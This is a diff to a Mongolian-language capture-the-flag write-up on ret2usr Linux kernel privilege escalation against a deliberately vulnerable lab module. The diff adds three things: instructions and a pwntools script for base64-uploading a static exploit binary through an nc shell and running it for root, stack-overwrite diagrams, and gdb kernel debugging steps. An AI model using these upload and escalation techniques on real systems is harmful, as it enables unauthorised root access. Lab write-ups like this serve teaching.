@@ -20,7 +20,7 @@ stack overflow-оор return address-ийг **userland дахь өөрсдийн
 
 | Хэсэг | Тайлбар |
 |-------|---------|
-| `bzImage` | Компил хийсэн Linux kernel (Linux 6.6.58) |
+| `bzImage` | Compile хийсэн Linux kernel (Linux 6.6.58) |
 | `rootfs.cpio.gz` | initramfs — BusyBox file system (эмзэг модуль, flag агуулна) |
 | `vuln.ko` | **Эмзэг kernel модуль**, `/dev/vuln` төхөөрөмж үүсгэнэ |
 | `run.sh` | QEMU-г эдгээрээр ачаалах скрипт |
@@ -60,21 +60,76 @@ cat: can't open '/root/flag.txt': Permission denied
 Exploit-ээ VM-д оруулахын тулд `run.sh`-д дамжуулна (rootfs-д `/exploit` болгон нэмж **автоматаар ажиллуулна**):
 
 ```console
-$ gcc -static -o exploit exploit.c
+$ musl-gcc -static -o exploit exploit.c    # эсвэл gcc -static (томдоно)
 $ ./run.sh exploit
 ```
 
 **Сервер (remote) хувилбар.** Challenge-ийг Docker image хэлбэрээр ажиллуулж болно. Холбогдоход шууд
-эрхгүй (uid 1000) **бүрэн shell** өгнө (хугацааны хязгааргүй). `/tmp` бичигдэх тул static exploit-ээ
-base64-ээр оруулж ажиллуулна:
+эрхгүй (uid 1000) **бүрэн shell** өгнө (хугацааны хязгааргүй):
 
 ```console
 $ docker run --rm -p 1337:1337 ghcr.io/computer-communication-security-club/pwn-ret2usr
 $ nc localhost 1337
-/ $ base64 -d > /tmp/e << "END"       # өөр дээрээ: gcc -static -o exploit exploit.c && base64 -w0 exploit
-<exploit-ийн base64>
-END
-/ $ chmod +x /tmp/e; /tmp/e
+[ /dev/vuln ready; эрхгүй хэрэглэгч (uid 1000) ]
+/ $
+```
+
+#### Compiled exploit-ийг remote руу дамжуулах
+
+Remote-д **compiler байхгүй** (жижиг initramfs), тиймээс exploit-ээ өөр дээрээ **static** болгон compile
+хийгээд гарсан **binary**-г shell рүү хуулж авчирна. `/tmp` нь бичигдэх (`1777`) тул тэнд хадгална.
+
+:::tip[musl ашигла]
+glibc-ийн static binary том (~870 KB) тул base64 нь ~1.1 MB болж paste удаан/эвдрэлтэй. **`musl-gcc`**-ээр
+угсарвал ижил exploit дөнгөж **~48 KB** (base64 ~65 KB) болж дамжуулалт хурдан, найдвартай. Тохируулах:
+`sudo apt install musl-tools`.
+:::
+
+Хамгийн энгийн арга — binary-г **base64** болгоод `nc` shell дотор буцаан задлах. Хоёр зүйл чухал:
+
+- base64-ийг **мөр болгон таслана** (`-w0` БИШ). tty нэг input мөрөнд ~4 KB-аас илүүг оруулахгүй тул
+  нэг урт мөр таслагдана. Энгийн `base64` (coreutils) 76 тэмдэгтээр таслдаг — яг тохирно.
+- shell prompt гарч ирсний **дараа** paste хийнэ. Ачаалж дуусаагүй байхад илгээвэл алдагдана.
+
+```console
+# local дээр:
+$ musl-gcc -static -o exploit exploit.c    # жижиг static binary
+$ base64 exploit > e.b64                    # 76 тэмдэгтээр тасарсан (-w0 БИШ!)
+
+# remote shell дотор (prompt гарсны дараа):
+/ $ base64 -d > /tmp/e << 'EOF'
+<e.b64-ийн агуулгыг энд буулгана>
+EOF
+/ $ chmod +x /tmp/e && /tmp/e
+[+] root авлаа!
+/ # cat /root/flag.txt
+```
+
+Том binary-гийн base64 заримдаа эвдэрдэг тул шалгаж болно — хоёр тал ижил байх ёстой:
+
+```console
+# local:  sha1sum exploit
+# remote: sha1sum /tmp/e
+```
+
+Бүгдийг автоматжуулах **pwntools template** (local талд ажиллана):
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+io = remote('localhost', 1337)                   # эсвэл remote(HOST, PORT)
+io.recvuntil(b'uid 1000')                         # VM shell бэлэн болтол хүлээнэ
+
+data = read('exploit')                            # local static binary
+b64  = b64e(data)
+wrapped = '\n'.join(b64[i:i+76] for i in range(0, len(b64), 76))  # tty мөрийн хязгаарт багтаана
+
+io.sendlineafter(b'$ ', b"base64 -d > /tmp/e << 'EOF'")
+io.sendline(wrapped.encode())
+io.sendline(b'EOF')
+io.sendlineafter(b'$ ', b'chmod +x /tmp/e && /tmp/e')
+io.interactive()                                  # root shell → cat /root/flag.txt
 ```
 
 :::tip[gdb-ээр debug хийх]
@@ -104,7 +159,7 @@ static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
     char *p = buf;
     struct req r;
 
-    __asm__ volatile("" : "+r"(p));       // буферийн хэмжээг компиляторт нуух (FORTIFY)
+    __asm__ volatile("" : "+r"(p));       // буферийн хэмжээг compiler-аас нуух (FORTIFY)
     if (copy_from_user(&r, (void __user *)arg, sizeof(r)))
         return -EFAULT;
 
@@ -205,6 +260,8 @@ offset = 0x120 − 0x10 = 0x110
 
 `0x110` байт бичээд дараагийн 8 байт return address-ийг дарна. **Stack canary байхгүй.**
 
+![vuln_ioctl-ийн kernel stack: доороос дээш struct req r (16 B, rsp), char buf[0x100] (rsp+0x10), saved rbx, saved rbp, return address (rsp+0x120). copy_from_user нь buf-аас дээш бичдэг тул 0x110 байтын дараа return address-ийг дарж, escalate() руу чиглүүлнэ.](../../../../assets/pwn/ret2usr-stack.svg)
+
 :::tip[gdb-ээр cyclic-оор олох]
 Disassemble уншихын оронд [userland](../../userland/ret2text/#4-offset-олох)-тай яг адил **cyclic pattern**-ээр ч
 offset-ийг олж болно. Pattern-ийг overflow-оор илгээхэд kernel `ret` хийх гэж буй утга нь pattern-ийн тодорхой
@@ -240,6 +297,8 @@ root болох хамгийн энгийн арга: kernel дотор `commit_
 2. `ret` хийхэд CPU `escalate()` руу **ring 0-д** үсэрнэ.
 3. `escalate()` дотор `commit_creds(&init_cred)` дуудаж root болно.
 4. `swapgs; iretq`-ээр цэвэрхэн userland руу буцаж (KPTI off) root shell нээнэ.
+
+![ret2usr урсгал: ① vuln_ioctl-ийн дарагдсан return address нь userland руу буцаана (SMEP унтраалттай тул ring 0 хэвээр); ② escalate() userland функц commit_creds(&init_cred) дуудаж процессыг root болгоно; ③ swapgs; iretq-ээр userland руу цэвэрхэн буцна; ④ win() нь uid 0-оор system("/bin/sh") дуудаж root shell нээнэ.](../../../../assets/pwn/ret2usr-flow.svg)
 
 ### 4. Kernel хаяг олох
 
@@ -344,7 +403,7 @@ int main(void) {
 ### 6. Ажиллуулах
 
 ```console
-$ gcc -static -o exploit exploit.c
+$ musl-gcc -static -o exploit exploit.c    # эсвэл gcc -static (томдоно)
 $ ./run.sh exploit
 ...
 [ /dev/vuln ready; эрхгүй хэрэглэгч (uid 1000) ]
@@ -357,6 +416,43 @@ FLAG{ret2usr_kernel_pr1v_esc}
 ```
 
 Эрхгүй хэрэглэгчээс kernel-ийн алдаагаар **root** боллоо.
+
+## Debug хийх
+
+Kernel-д userland шиг процесс бүрийг тусад нь ажиллуулдаггүй — бүхэл цөмийг QEMU-ийн **gdbstub**-аар debug
+хийнэ. `run.sh`-ийн qemu мөрөнд `-s` нэмбэл QEMU `localhost:1234` дээр gdb server нээнэ (`-S` нэмбэл CPU-г
+зогсоосон хэвээр эхэлж, эхнээс нь алхаж болно).
+
+gdb-г `vmlinux`-тэй холбоно:
+
+```console
+$ gdb vmlinux
+(gdb) target remote :1234
+```
+
+Дараа нь модулийн symbol-уудыг ачаална. `nokaslr` тул модуль **тогтмол** хаягт (`0xffffffffa0000000`,
+`.text` нь `+0x10`-д) ачаалагддаг — эсвэл guest дотроос `cat /sys/module/vuln/sections/.text`-ээр хараарай:
+
+```console
+(gdb) add-symbol-file vuln.ko 0xffffffffa0000010
+(gdb) break vuln_ioctl
+Breakpoint 1 at 0xffffffffa0000020
+(gdb) continue
+```
+
+Guest дотор exploit (эсвэл жижиг trigger) `ioctl(fd, CMD_STORE, ...)` дуудмагц breakpoint зогсоно. Тэндээс:
+
+- `bt`, `info registers`, `disassemble vuln_ioctl` — [section 2](#2-offset-олох)-ийн stack frame-ийг биетээр хар.
+- Return address дарагдахыг ажиглах: функцийн `ret` (`vuln_ioctl+0x88`) дээр **hbreak** тавиад `x/gx $rsp` —
+  энэ нь яг [section 2-ийн cyclic арга](#2-offset-олох).
+
+:::caution[Kernel debug-ийн онцлог]
+- Модулийн `.text` нь read-only тул software breakpoint суудаггүй — **hardware breakpoint** (`hbreak`) хэрэглэнэ.
+- Guest дотор gdb байхгүй тул **userland exploit**-оо `printf`-ээр эсвэл host талаас `copy_from_user` дээр
+  breakpoint тавьж буферт орж буй өгөгдлийг хянаж debug хийнэ.
+- `commit_creds`, `init_cred` зэрэг kernel symbol-уудын хаягийг `cat /proc/kallsyms` (root) эсвэл gdb дотор
+  `p &commit_creds`-ээр гаргана.
+:::
 
 ## Хамгаалалт
 
